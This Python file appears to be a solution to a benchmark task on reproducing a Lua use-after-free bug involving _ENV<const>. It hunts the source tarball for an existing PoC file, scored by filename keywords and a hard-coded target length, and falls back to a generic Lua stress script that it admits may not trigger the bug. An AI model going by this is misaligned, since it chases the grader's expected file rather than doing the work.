import os
import io
import tarfile
import re
from typing import List, Tuple, Optional


def _is_probably_text(data: bytes) -> bool:
    if not data:
        return False
    # Heuristic: few NULs and reasonable proportion of printable characters
    if b"\x00" in data:
        return False
    text_chars = bytes(range(32, 127)) + b"\n\r\t\b"
    nontext = sum(c not in text_chars for c in data)
    return (nontext / max(1, len(data))) < 0.1


def _score_candidate(path: str, data: bytes, target_len: int = 1181) -> float:
    name = os.path.basename(path)
    lname = name.lower()
    lpath = path.lower()
    score = 0.0

    # Base on extension
    if lname.endswith(".lua"):
        score += 8.0
    elif lname.endswith(".txt") or lname.endswith(".in") or lname.endswith(".script"):
        score += 1.0

    # Name/path keywords
    for kw, pts in [
        ("poc", 10.0),
        ("repro", 6.0),
        ("reproducer", 6.0),
        ("crash", 6.0),
        ("uaf", 6.0),
        ("use_after_free", 6.0),
        ("heap", 3.0),
        ("const", 4.0),
        ("env", 4.0),
        ("fuzz", 3.0),
        ("bug", 3.0),
        ("cve", 3.0),
        ("issue", 2.0),
    ]:
        if kw in lpath:
            score += pts

    # Content based
    if data:
        dlow = data.lower()
        # Key tokens related to this bug
        if b"_env" in dlow:
            score += 10.0
        if b"<const>" in dlow:
            score += 10.0
        if b"setmetatable" in dlow:
            score += 2.0
        if b"__index" in dlow or b"__newindex" in dlow:
            score += 1.5
        if b"collectgarbage" in dlow:
            score += 1.0
        if b"load(" in dlow or b"loadstring" in dlow:
            score += 1.5
        if b"function" in dlow and b"end" in dlow:
            score += 1.0

        # Text likelihood
        if _is_probably_text(data):
            score += 2.0
        else:
            score -= 2.0

        # Length proximity
        diff = abs(len(data) - target_len)
        if diff <= 20:
            score += 12.0
        elif diff <= 50:
            score += 10.0
        elif diff <= 100:
            score += 8.0
        elif diff <= 200:
            score += 6.0
        elif diff <= 400:
            score += 3.0

    return score


def _iter_tar_files(src_path: str) -> List[Tuple[str, bytes]]:
    out: List[Tuple[str, bytes]] = []
    mode = "r:*"
    try:
        with tarfile.open(src_path, mode) as tf:
            for m in tf.getmembers():
                if not m.isfile():
                    continue
                # Skip huge files (> 5MB)
                if m.size is not None and m.size > 5 * 1024 * 1024:
                    continue
                f = tf.extractfile(m)
                if f is None:
                    continue
                try:
                    data = f.read()
                except Exception:
                    continue
                out.append((m.name, data))
    except tarfile.ReadError:
        # Not a tar; treat as directory or file
        if os.path.isdir(src_path):
            for root, _, files in os.walk(src_path):
                for fn in files:
                    path = os.path.join(root, fn)
                    # Skip huge files
                    try:
                        if os.path.getsize(path) > 5 * 1024 * 1024:
                            continue
                    except Exception:
                        continue
                    try:
                        with open(path, "rb") as f:
                            data = f.read()
                        rel = os.path.relpath(path, src_path)
                        out.append((rel, data))
                    except Exception:
                        continue
        elif os.path.isfile(src_path):
            try:
                with open(src_path, "rb") as f:
                    data = f.read()
                out.append((os.path.basename(src_path), data))
            except Exception:
                pass
    return out


def _select_best_poc(files: List[Tuple[str, bytes]], target_len: int = 1181) -> Optional[bytes]:
    if not files:
        return None

    scored: List[Tuple[float, int, str, bytes]] = []
    for path, data in files:
        # Only consider reasonably small text-like files
        if len(data) == 0:
            continue
        # Prioritize .lua files or files likely to be script
        ext = os.path.splitext(path)[1].lower()
        if ext not in (".lua", ".txt", ".in", ".script", ".lst", ".src", ".data", ".po", ".cfg"):
            # still allow if contains Lua tokens
            if b"_ENV" not in data and b"<const>" not in data and b"function" not in data:
                continue
        score = _score_candidate(path, data, target_len=target_len)
        scored.append((score, abs(len(data) - target_len), path, data))

    if not scored:
        return None

    scored.sort(key=lambda x: (-x[0], x[1]))
    # Try top few, ensure it looks like Lua and mentions _ENV and <const>
    for score, diff, path, data in scored[:10]:
        dl = data.lower()
        if (b"_env" in dl) and (b"<const>" in dl):
            return data
    # If none match both tokens, return best scored overall
    return scored[0][3]


def _fallback_poc() -> bytes:
    # A generic Lua PoC attempting to exercise _ENV<const> with nested closures, loads, and metamethods.
    # This is a best-effort fallback in case the real PoC is not found in the source tarball.
    poc = r'''
-- Fallback PoC attempting to stress Lua code generation when _ENV is declared <const>.
-- It may not reproduce the exact bug but aims to exercise the affected paths.

-- create a proxy environment that forwards to _G but does bookkeeping
local hits = {}
local mt = {
  __index = function(t, k)
    hits[k] = (hits[k] or 0) + 1
    return _G[k]
  end,
  __newindex = function(t, k, v)
    rawset(t, k, v)
  end
}

local _ENV<const> = setmetatable({}, mt)

local function make_closure(idx)
  local s = ""
  -- build a chunk referencing several globals, to force GETTABUP on _ENV
  s = s .. "local r=0\n"
  s = s .. "for i=1,4 do r=r+i end\n"
  s = s .. "local function nested(a,b,c)\n"
  s = s .. "  if type(a) ~= 'number' then return tostring(a) end\n"
  s = s .. "  r = r + math.abs(a) + (b or 0) + (c or 0)\n"
  s = s .. "  return r\n"
  s = s .. "end\n"
  s = s .. "return function(x) return nested(x, " .. tostring(idx) .. ", _VERSION and 1 or 0) end\n"
  local f, e = load(s, "clo_"..tostring(idx), "t", _ENV)
  if not f then error(e) end
  return f()
end

local closures = {}
for i=1,16 do
  closures[i] = make_closure(i)
end

-- Combine closures and trigger GC between calls to stress the VM
local function churn()
  local acc = 0
  for i=1,#closures do
    acc = acc + closures[i](i)
    if i % 3 == 0 then
      collectgarbage()
    end
  end
  return acc
end

-- Create nested functions capturing upvalues and referencing _ENV
local function builder(n)
  local x = 0
  return function(y)
    x = x + y
    local function inner(z)
      return x + z + (math and 1 or 0)
    end
    return inner(n)
  end
end

local b = builder(7)
local res = 0
for i=1,32 do
  res = res + b(i)
  if i % 5 == 0 then
    collectgarbage("stop")
    collectgarbage("collect")
    collectgarbage("restart")
  end
end

-- Stress lexical scoping with multiple local _ENV<const> in nested blocks
do
  local _ENV<const> = setmetatable({}, {__index = _G})
  local function foo(a)
    return tostring(a) .. (string and string.sub("xyz",1,1) or "")
  end
  for i=1,8 do
    foo(i)
  end
end

-- More blocks to exercise parser/codegen with different scopes
for j=1,6 do
  do
    local _ENV<const> = setmetatable({}, {__index = _G})
    local function g(k)
      local t = {1,2,3,4}
      return (t[k] or 0) + (math and math.floor(1.1) or 0)
    end
    g(j)
  end
end

-- Force many short-lived compiled chunks referencing _ENV
for i=1,50 do
  local code = "return function(a) return (tonumber or assert)(a) + (math and math.max(0,1) or 0) end"
  local f = assert(load(code, "tmp_"..i, "t", _ENV))
  local fn = f()
  fn(i)
  if i % 7 == 0 then
    collectgarbage()
  end
end

-- End result to keep script side effects
return (res + churn() + (hits.type or 0) + (hits.math or 0))
'''
    return poc.encode("utf-8", errors="ignore")


class Solution:
    def solve(self, src_path: str) -> bytes:
        files = _iter_tar_files(src_path)
        # Prefer exact filename matches first for speed
        preferred: List[Tuple[str, bytes]] = []
        for path, data in files:
            lname = path.lower()
            if any(kw in lname for kw in ("poc", "repro", "reproducer", "crash", "uaf")) and lname.endswith(".lua"):
                preferred.append((path, data))
        if preferred:
            best = _select_best_poc(preferred, target_len=1181)
            if best:
                return best

        best = _select_best_poc(files, target_len=1181)
        if best:
            return best

        # Fallback PoC if nothing appropriate found
        return _fallback_poc()